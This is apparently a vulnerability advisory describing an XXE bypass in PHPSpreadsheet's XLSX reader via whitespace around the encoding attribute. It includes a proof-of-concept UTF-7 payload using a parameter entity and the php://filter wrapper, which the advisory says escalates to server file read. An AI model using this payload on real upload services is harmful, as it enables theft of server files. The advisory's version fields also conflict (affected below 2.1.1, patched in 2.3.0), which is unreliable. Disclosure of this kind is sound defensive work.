# XXE in PHPSpreadsheet's XLSX reader

>= 2.0.0, < 2.1.1

## Patched versions

2.3.0

## Description

### Summary

The security scanner responsible for preventing XXE attacks in the XLSX reader can be bypassed by slightly modifying the XML structure, utilizing white-spaces. On servers that allow users to upload their own Excel (XLSX) sheets, Server files and sensitive information can be disclosed by providing a crafted sheet.

### Details

The security scan function in `src/PhpSpreadsheet/Reader/Security/XmlScanner.php` contains a flawed XML encoding check to retrieve the input file's XML encoding in the `toUtf8` function.

The function searches for the XML encoding through a defined regex which looks for `encoding="*"` and/or `encoding='*'`, if not found, it defaults to the UTF-8 encoding which bypasses the conversion logic.

```
$patterns = [
           '/encoding="([^"]*]?)"/',
           "/encoding='([^']*?)'/",
];

```

This logic can be used to pass a UTF-7 encoded XXE payload, by utilizing a whitespace before or after the `=` in the attribute definition.

### PoC

Needed:

* An Excel sheet (XLSX) with at least one cell containing a value.

Unzip the excel sheet, and modify the `xl/SharedStrings.xml` file with the following value (note the space after `encoding=`):

```
<?xml version="1.0" encoding= 'UTF-7' standalone="yes"?>
+ADw-!DOCTYPE abc [ ... ]>

```
#### Step-by-step

1. First off, the following string is encoded in base64:

```
<!ENTITY internal 'abc'  >"

```

Resulting in:

```
PCFFTlRJVFkgaW50ZXJuYWwgJ2FiYycgID4K

```

2. The string is used with a parameter entity and the PHP filter wrapper to ultimately define custom entities and call them within the XML.

```
<?xml version="1.0" encoding= 'UTF-7' standalone="yes"?>
+ADw-!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "php://filter//resource=data://text/plain;base64,PCFFTlRJVFkgaW50ZXJuYWwgJ2FiYycgID4K" > %xxe;]>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="1" uniqueCount="1"><si><t>&internal;</t></si></sst>

```

When this file is parsed by the library, the value `abc` should be in the original filled cell.

With the help of the PHP filter wrapper, this can be escalated to information disclosure/file read.

### Impact

Sensitive information disclosure through the XXE on sites that allow users to upload their own excel spreadsheets, and parse them using PHPSpreadsheet's Excel parser.

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
